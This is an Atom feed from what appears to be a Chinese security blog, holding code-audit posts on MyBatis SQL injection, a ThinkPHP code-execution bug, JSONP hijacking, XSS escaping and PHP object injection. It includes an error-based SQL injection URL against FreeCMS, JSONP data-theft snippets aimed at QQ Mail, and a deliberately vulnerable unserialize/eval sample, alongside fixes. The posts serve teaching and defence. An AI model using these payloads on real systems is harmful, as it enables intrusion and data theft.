<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[xd_xd's blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://xdxd.love/"/>
  <updated>2016-03-15T02:24:39.000Z</updated>
  <id>http://xdxd.love/</id>
  
  <author>
    <name><![CDATA[xd_xd]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[审计mybatis的sql注入]]></title>
    <link href="http://xdxd.love/2016/03/14/%E5%AE%A1%E8%AE%A1mybatis%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://xdxd.love/2016/03/14/审计mybatis的sql注入/</id>
    <published>2016-03-14T07:27:24.000Z</published>
    <updated>2016-03-15T02:24:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录</p>
<h1 id="mybatis存在的sql注入问题">mybatis存在的sql注入问题</h1><p>mybatis避免了用户直接拼接SQL语句，但是认为只要使用了mybatis就可以杜绝SQL注入的观点是不正确的。mybatis在配置SQL语句的时候，有两种描述参数的方式。<code>#{}</code>和<code>${}</code>。</p>
<p>比如：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"selectPerson"</span> parameterType=<span class="string">"int"</span> resultType=<span class="string">"hashmap"</span>&gt;
  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> ID = <span class="preprocessor">#{id}</span>
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这个语句被称作 selectPerson，接受一个 int（或 Integer）类型的参数，并返回一个 HashMap类型的对象，其中的键是列名，值便是结果行中的对应值。</p>
<p>注意参数符号：</p>
<pre><code>#{<span class="ruby">id}</span>
</code></pre><p>这就告诉 MyBatis 创建一个预处理语句参数，通过 JDBC，这样的一个参数在 SQL中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
<pre><code>// Similar JDBC <span class="preprocessor">code</span>, NOT MyBatis…
<span class="keyword">String </span><span class="keyword">selectPerson </span>= <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span><span class="comment">;</span>
<span class="label">PreparedStatement</span> ps = conn.prepareStatement(<span class="keyword">selectPerson);
</span><span class="label">ps.setInt</span>(<span class="number">1</span>,id)<span class="comment">;</span>
</code></pre><p>使用<code>#</code>mybatis会使用预编译来处理参数，这样子可以避免SQL注入。</p>
<p>但是使用<code>$</code>描述参数会直接把变量拼接到SQL语句中，不做任何处理。相当于直接字符串拼接SQL。这样的方式就可能存在SQL注入。下面的描述来自mybatis官方文档。</p>
<pre><code>默认情况下,使用#{}格式的语法会导致 MyBatis 创建预处理语句属性并安全地设置值（比如?）。这样做更安全，更迅速，通常也是首选做法，不过有时你只是想直接在 SQL 语句中插入一个不改变的字符串。比如，像 <span class="keyword">ORDER</span> <span class="keyword">BY</span>，你可以这样来使用：

<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="label">${columnName}</span>
这里 MyBatis 不会修改或转义字符串。

<span class="keyword">NOTE</span> 以这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的 SQL 注入攻击，因此要么不允许用户输入这些字段，要么自行转义并检验。
</code></pre><h1 id="demo演示">demo演示</h1><p>使用<a href="http://www.cnblogs.com/zhanjindong/p/3397828.html" target="_blank" rel="external">MyBatis使用示例</a>作为demo测试。</p>
<p>mapper文件：</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
<span class="doctype">&lt;!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span>
<span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">namespace</span>=<span class="value">"test.mybatis.UserMapper"</span>&gt;</span>
    <span class="comment">&lt;!-- 这里namespace必须是UserMapper接口的路径” --&gt;</span>
    <span class="tag">&lt;<span class="title">insert</span> <span class="attribute">id</span>=<span class="value">"insertUser"</span> <span class="attribute">parameterType</span>=<span class="value">"User"</span>&gt;</span>
        insert into user(name,age) values(#{name},#{age})
        <span class="comment">&lt;!-- 这里sql结尾不能加分号，否则报“ORA-00911”的错误 --&gt;</span>
    <span class="tag">&lt;/<span class="title">insert</span>&gt;</span>
    <span class="comment">&lt;!-- 这里的id必须和UserMapper接口中的接口方法名相同 --&gt;</span>
    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"getUser"</span> <span class="attribute">resultType</span>=<span class="value">"User"</span>&gt;</span>
        select * from user where name=#{name}
    <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
<span class="tag">&lt;/<span class="title">mapper</span>&gt;</span>
</code></pre><p>在输入中插入单引号</p>
<pre><code><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getUser</span>(<span class="params"></span>) </span>{
    SqlSession sqlSession = sqlSessionFactory.openSession();
    <span class="keyword">try</span> {
        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);
        User user = userMapper.getUser(<span class="string">"'zhangsan"</span>);
        System.<span class="keyword">out</span>.println(<span class="string">"name: "</span> + user.getName() + <span class="string">"|age: "</span>
                + user.getAge());
    } <span class="keyword">finally</span> {
        sqlSession.close();
    }
</code></pre><p>查看执行的sql语句：</p>
<p><img src="/images/mybatis21.png" alt=""></p>
<p>可以看到输入被单引号包裹，并且对字符串中的单引号进行了转义。</p>
<p>将<code>#</code>改成<code>$</code>,mapper文件为：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getUser"</span> resultType=<span class="string">"User"</span>&gt;
    <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> name=${_parameter}
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这里由于代码的写法问题，name需要改成_parameter,参考<a href="http://woshixy.blog.51cto.com/5637578/1180914" target="_blank" rel="external">Mybatis中传参包There is no getter for property named XXX in class java.lang.String</a>。</p>
<p>查看执行的SQL语句：</p>
<p><img src="/images/mybatis22.png" alt=""></p>
<p>输入没有任何改变的拼接到SQL中，造成了SQL注入。</p>
<h1 id="实战分析">实战分析</h1><p>mybatis generator插件默认生成的order by 条件是使用<code>$</code>表示变量。</p>
<pre><code>...
 <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectByExample"</span> <span class="attribute">resultMap</span>=<span class="value">"BaseResultMap"</span> <span class="attribute">parameterType</span>=<span class="value">"com.tgwoo.ctspmt.model.MtVMsgItemExample"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectPrefix"</span> /&gt;</span>
    select
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"distinct"</span> &gt;</span>
      distinct
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Base_Column_List"</span> /&gt;</span>
    from CTSPMT.MT_V_MSG_ITEM
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"_parameter != null"</span> &gt;</span>
      <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Example_Where_Clause"</span> /&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"orderByClause != null"</span> &gt;</span>
      order by ${orderByClause}
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectSuffix"</span> /&gt;</span>
  <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
...
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectPrefix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      select * from ( select row_.*, rownum rownum_ from ( 
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectSuffix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      <span class="cdata">&lt;![CDATA[ ) row_ ) where rownum_ &gt; #{page.begin} and rownum_ &lt;= #{page.end} ]]&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
...
</code></pre><p>所以使用mybatis generator插件生成的代码中，需要自己过滤order by参数，如果用户可控就会导致SQL注入。而大部分情况下，开发者可能没有意识到这个问题。</p>
<p>以freecms为例。<a href="http://www.freeteam.cn/" target="_blank" rel="external">Freecms</a>是一款开源javacms。最新版下载<a href="http://www.freeteam.cn/freecms1.5.rar" target="_blank" rel="external">地址</a>。freecms中的orderby都是使用的<code>$</code>描述变量。</p>
<p><img src="/images/mybatis23.png" alt=""></p>
<p>前面的分析可以知道，这种情况，mybatis会直接拼接字符串到SQL中不做任何处理。</p>
<p>注册用户登录访问：</p>
<pre><code>http://192.168.99.100:8080/freecms/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select%20user()),0x7C))
</code></pre><p><img src="/images/mybatis24.png" alt=""></p>
<p>查看执行的SQL为：</p>
<p><img src="/images/mybatis25.png" alt=""></p>
<h1 id="修复方案">修复方案</h1><p>尽量使用<code>#</code>描述参数，如果一定要使用<code>$</code>，则需要自己过滤用户输入。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持]]>
    </summary>
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[thinkphp URL命令执行漏洞分析]]></title>
    <link href="http://xdxd.love/2016/03/11/thinkphp-URL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/03/11/thinkphp-URL命令执行漏洞分析/</id>
    <published>2016-03-11T07:14:03.000Z</published>
    <updated>2016-03-11T08:06:17.000Z</updated>
    <content type="html"><![CDATA[<p>漏洞很老了。整理一下。<a href="http://www.thinkphp.cn/info/55.html" target="_blank" rel="external">补丁地址</a></p>
<p>代码修复的方式为：</p>
<pre><code>/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php 
<span class="number">125</span>  -   <span class="variable">$res</span> = preg_replace(<span class="string">'@(w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']="\\2";'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>)); 
<span class="number">125</span>  +   <span class="variable">$res</span> = preg_replace(<span class="string">'@(w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']=\'</span>\\<span class="number">2</span>\<span class="string">';'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>)); 
</code></pre><p>这里导致代码执行的原因有两个，一是preg_replace使用了e修饰符，这样<code>$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;</code> 会被当做php代码执行。而双引号的变量会被解析，导致了代码执行。</p>
<p>关键代码为：</p>
<pre><code><span class="variable">$depr</span> = C(<span class="string">'URL_PATHINFO_DEPR'</span>);
        // 分析PATHINFO信息
        self::getPathInfo();
        <span class="keyword">if</span>(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
            <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim($_SERVER[<span class="string">'PATH_INFO'</span>],<span class="string">'/'</span>));
            <span class="variable">$var</span>  =  array();
            if (C(<span class="string">'APP_GROUP_LIST'</span>) &amp;&amp; !isset($_GET[C(<span class="string">'VAR_GROUP'</span>)])){
                <span class="variable">$var</span>[C(<span class="string">'VAR_GROUP'</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">','</span>,strtolower(C(<span class="string">'APP_GROUP_LIST'</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">''</span>;
                if(C(<span class="string">'APP_GROUP_DENY'</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">'VAR_GROUP'</span>)]),explode(<span class="string">','</span>,strtolower(C(<span class="string">'APP_GROUP_DENY'</span>))))) {
                    // 禁止直接访问分组
                    exit;
                }
            }
            if(!isset($_GET[C(<span class="string">'VAR_MODULE'</span>)])) {// 还没有定义模块名称
                <span class="variable">$var</span>[C(<span class="string">'VAR_MODULE'</span>)]  =   array_shift(<span class="variable">$paths</span>);
            }
            <span class="variable">$var</span>[C(<span class="string">'VAR_ACTION'</span>)]  =   array_shift(<span class="variable">$paths</span>);
            // 解析剩余的URL参数
            <span class="variable">$res</span> = preg_replace(<span class="string">'@(\w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']=strip_tags(\'</span>\\<span class="number">2</span>\<span class="string">');'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));
            $_GET   =  array_merge(<span class="variable">$var</span>,$_GET);
        }
</code></pre><h1 id="反思">反思</h1><p>深入理解漏洞原型，理清复杂逻辑</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://www.zzxiaoyu.cn/?post=63" target="_blank" rel="external">Thinkphp 3.0-3.1版代码执行</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>漏洞很老了。整理一下。<a href="http://www.thinkphp.cn/info/55.html" target="_blank" rel="external">补丁地址</a></p>
<p>代码修复的方式为：</p>
<pre><code>/trunk/T]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[正则表达式练级]]></title>
    <link href="http://xdxd.love/2016/03/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%83%E7%BA%A7/"/>
    <id>http://xdxd.love/2016/03/10/正则表达式练级/</id>
    <published>2016-03-10T07:16:33.000Z</published>
    <updated>2016-03-10T07:27:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="external">正则表达式入门教程</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="external">正则表达式入门教程</a></p>
]]>
    </summary>
    
      <category term="软件开发" scheme="http://xdxd.love/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[referer安全技术攻防]]></title>
    <link href="http://xdxd.love/2016/03/10/referer%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%94%BB%E9%98%B2/"/>
    <id>http://xdxd.love/2016/03/10/referer安全技术攻防/</id>
    <published>2016-03-10T07:09:02.000Z</published>
    <updated>2016-03-10T07:09:02.000Z</updated>
    <content type="html"></content>
    <summary type="html">
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[jsonp漏洞分析]]></title>
    <link href="http://xdxd.love/2016/03/10/jsonp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/03/10/jsonp漏洞分析/</id>
    <published>2016-03-10T02:46:53.000Z</published>
    <updated>2016-03-10T07:06:32.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>json(javascript object notation)是javascript对象表示法的意思。</p>
<p>比如：</p>
<pre><code>var impromptu_object = {
    <span class="string">"given_name"</span> : <span class="string">"john"</span>,
    <span class="string">"family_name"</span>: <span class="string">"smith"</span>,
    <span class="string">"lucky_numbers"</span>: [<span class="number">11630</span>,<span class="number">12067</span>,<span class="number">12407</span>,<span class="number">12887</span>]
};
alert(impromptu_object.given_name);
</code></pre><p>运行结果是弹出john。</p>
<p>jsonp字面上的含义是”填充式(padding)的JSON”,它通过填充二外的内容吧JSON序列化包装起来，变成一段有效的可以独立运行的Javascript语句。常见的例子包括函数调用(例如callback_function({…JSON data…}))或变量赋值(var return_value = {…JSON data…})</p>
<h1 id="利用方式">利用方式</h1><p>返回值形式为：变量赋值的形式</p>
<pre><code>Qmail.newMailsList={total:446,mailHome:"http://mail.qq.com/cgi-bin/login?f...


<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
<span class="keyword">var</span> Qmail={};   先定义变量
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">  
alert(Qmail.newMailsList.nextUrl);  
alert(<span class="built_in">document</span>.scripts[<span class="number">1</span>].src=Qmail.newMailsList.nextUrl);  
alert(Qmail.newMailsList.summary);  
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
</code></pre><p>返回值形式为函数调用</p>
<pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
<span class="function"><span class="keyword">function</span> <span class="title">wooyun_callback</span><span class="params">(a)</span></span>{  
alert(a);  
}  
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://www.wooyun.org/userdata.php?callback=wooyun_callback"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
</code></pre><h1 id="防御方案">防御方案</h1><p>1，对于同域的json使用情况下，可以在数据的输出头部加入while(1);的方式避免数据被script标签的方式引用，这可以防止一些比较有特性的浏览器里导致的数据泄漏。腾讯的一个案例加了”-1”</p>
<pre><code><span class="comment">//Ignoring The First Item "-1"Qmail.newMailsList={total:</span>
</code></pre><p>2,referer的来源限制，利用前端referer的不可伪造性来保障请求数据的应用来源于可信的地方，此种方式力度较稀，完全依赖于referer，某些情况下（如存在xss）可能导致被绕过。</p>
<p>3,token的加入，严格来说，这种利用javascript hijacking的方式获取数据是CSRF的一种，不过较之传统的CSRF不能获取数据只能提交而言，这种方式利用javascript可以获取一些敏感信息而已。如果我们能让攻击者对接口未知，就可以实现json hijacking的防御了。利用token对调用者的身份进行认证，这种方式对于调用者的身份会要求力度较细，但是一旦出现xss也可能导致前端Token的泄露，从而导致保护失效。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="external">知道创宇  JSONP 安全攻防技术</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>json(javascript object notation)是javascript对象表示法的意思。</p>
<p>比如：</p>
<pre><code>var impromptu_object = {
    <span ]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用转义防御XSS]]></title>
    <link href="http://xdxd.love/2016/03/09/%E4%BD%BF%E7%94%A8%E8%BD%AC%E4%B9%89%E9%98%B2%E5%BE%A1XSS/"/>
    <id>http://xdxd.love/2016/03/09/使用转义防御XSS/</id>
    <published>2016-03-09T07:53:57.000Z</published>
    <updated>2016-03-09T08:26:02.000Z</updated>
    <content type="html"><![CDATA[<p>在输出的时候防御XSS即对用户输入进行转义，XSS的问题本质上还是代码注入，HTML或者javascript的代码注入，即混淆了用户输入的数据和代码。而解决这个问题，就需要根据用户可控数据具体输出的环境进行恰当的转义。</p>
<h1 id="在html标签中输出">在html标签中输出</h1><pre><code><span class="tag">&lt;<span class="title">HTML标签</span>&gt;</span>[输出]<span class="tag">&lt;/<span class="title">HTML标签</span>&gt;</span>
</code></pre><p>只需要htmlencode即可。更具体是转义掉&lt; &gt; 就可以防止html注入。</p>
<h1 id="输出在普通html属性中">输出在普通html属性中</h1><pre><code><span class="tag">&lt;<span class="title">div</span> <span class="attribute">attr</span>=<span class="value">不可信数据</span>&gt;</span>content<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
</code></pre><p>好的方案应该是把不可信数据用双引号包裹起来，然后对数据进行htmlencode。</p>
<h1 id="在script标签中输出">在script标签中输出</h1><pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript"><span class="keyword">var</span> $a=<span class="string">"不可信数据"</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><p>确保输出变量在引号中，使用javascript编码输入数据。要防止<code>&lt;/script&gt;</code> 截断</p>
<h1 id="输出在on事件中">输出在on事件中</h1><pre><code><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">#</span> <span class="attribute">onlick</span>=<span class="value">"funcA('$var')"</span>&gt;</span> test<span class="tag">&lt;/<span class="title">a</span>&gt;</span>
</code></pre><p>防御：先做javascript编码，再做html编码。因为输出数据位于html标签属性中，浏览器会进行html自解码。</p>
<h1 id="在地址中输出">在地址中输出</h1><p>对协议进行白名单，http或者https，然后对其他部门进行url编码。避免javascript，data uri等伪协议攻击。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在输出的时候防御XSS即对用户输入进行转义，XSS的问题本质上还是代码注入，HTML或者javascript的代码注入，即混淆了用户输入的数据和代码。而解决这个问题，就需要根据用户可控数据具体输出的环境进行恰当的转义。</p>
<h1 id="在html标签中输出">在ht]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php对象注入漏洞]]></title>
    <link href="http://xdxd.love/2016/03/08/php%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/03/08/php对象注入漏洞/</id>
    <published>2016-03-08T10:29:59.000Z</published>
    <updated>2016-03-09T03:29:24.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考<a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">理解php对象注入</a>,文中练习代码可以在<a href="https://github.com/stayliv3/blog_material/tree/master/objecti" target="_blank" rel="external">这里下载</a></p>
<p>用户可控的数据进入了unserialize函数进行对象重建，通常通过(但不限于)魔术方法进行利用</p>
<h1 id="利用方式">利用方式</h1><h1 id="修复方案">修复方案</h1><p>避免用户可控的输入进入unserialize函数</p>
<h1 id="漏洞代码">漏洞代码</h1><p>php</p>
<pre><code>class RunCode
{
   public <span class="variable">$code</span>;
   function __construct()
   {

   }
   function __wakeup()
   {
        if(isset(<span class="variable">$this-</span>&gt;code))
        {
            eval(<span class="variable">$this-</span>&gt;code);
        }
   }
}
<span class="keyword">if</span>(isset($_REQUEST[<span class="string">'array'</span>]))
{   
 <span class="variable">$var1</span>=unserialize($_REQUEST[<span class="string">'array'</span>]);
if(is_array(<span class="variable">$var1</span>))
{
echo <span class="string">"&lt;br/&gt;First Element: "</span>.<span class="variable">$var1</span>[<span class="number">0</span>];
}
}
<span class="keyword">else</span>
{
echo <span class="string">"Array parameter is missing"</span>;
}
 ?&gt;
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考<a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="ext]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[sqli练级攻略]]></title>
    <link href="http://xdxd.love/2016/03/07/sqli%E7%BB%83%E7%BA%A7%E6%94%BB%E7%95%A5/"/>
    <id>http://xdxd.love/2016/03/07/sqli练级攻略/</id>
    <published>2016-03-07T07:34:09.000Z</published>
    <updated>2016-03-08T10:29:23.000Z</updated>
    <content type="html"><![CDATA[<h1 id="初窥门径">初窥门径</h1><h1 id="上下求索">上下求索</h1><h1 id="融会贯通">融会贯通</h1>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="初窥门径">初窥门径</h1><h1 id="上下求索">上下求索</h1><h1 id="融会贯通">融会贯通</h1>]]>
    </summary>
    
      <category term="练级攻略" scheme="http://xdxd.love/categories/%E7%BB%83%E7%BA%A7%E6%94%BB%E7%95%A5/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[order by注入点利用方式分析]]></title>
    <link href="http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
    <id>http://xdxd.love/2016/03/07/order-by注入点利用方式/</id>
    <published>2016-03-07T02:00:56.000Z</published>
    <updated>2016-03-08T07:58:08.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为：</p>
<pre><code>error_reporting(<span class="number">0</span>);
<span class="variable">$id</span>=$_GET[<span class="string">'sort'</span>];  
<span class="keyword">if</span>(isset(<span class="variable">$id</span>))
{
    //logging the connection parameters to a file for analysis.
    <span class="variable">$fp</span>=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);
    fwrite(<span class="variable">$fp</span>,<span class="string">'SORT:'</span>.<span class="variable">$id</span>.<span class="string">"\n"</span>);
    fclose(<span class="variable">$fp</span>);
    <span class="variable">$sql</span>=<span class="string">"SELECT * FROM users ORDER BY $id"</span>;
    /* execute multi query */
    if (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))
    {
</code></pre><p>可以通过asc 和desc查看返回数据是否相同来简单判断是否存在orderby注入。</p>
<p><img src="/images/orderby1.png" alt=""></p>
<p><img src="/images/orderby2.png" alt=""></p>
<h1 id="利用方式：">利用方式：</h1><p>mysql 5中 select order by的语法如下：</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> 
[ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ] 
  [<span class="keyword">HIGH_PRIORITY</span>] 
  [<span class="keyword">STRAIGHT_JOIN</span>] 
  [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>] 
  [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>] 
select_expr [, select_expr ...] 
[<span class="keyword">FROM</span> table_references 
[<span class="keyword">WHERE</span> where_condition] 
[<span class="keyword">GROUP</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]] 
[<span class="keyword">HAVING</span> where_condition] 
[<span class="keyword">ORDER</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...] 
[<span class="keyword">LIMIT</span> {[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>}] 
[<span class="keyword">PROCEDURE</span> procedure_name(argument_list)] 
[<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options 
  | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span> 
  | <span class="keyword">INTO</span> var_name [, var_name]] 
[<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span>
</code></pre><p>order by后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。由于order by 后面不可以跟union。</p>
<p>比如：</p>
<pre><code>select id ,rand(<span class="number">0</span>) from requests order by rand() <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1</span>
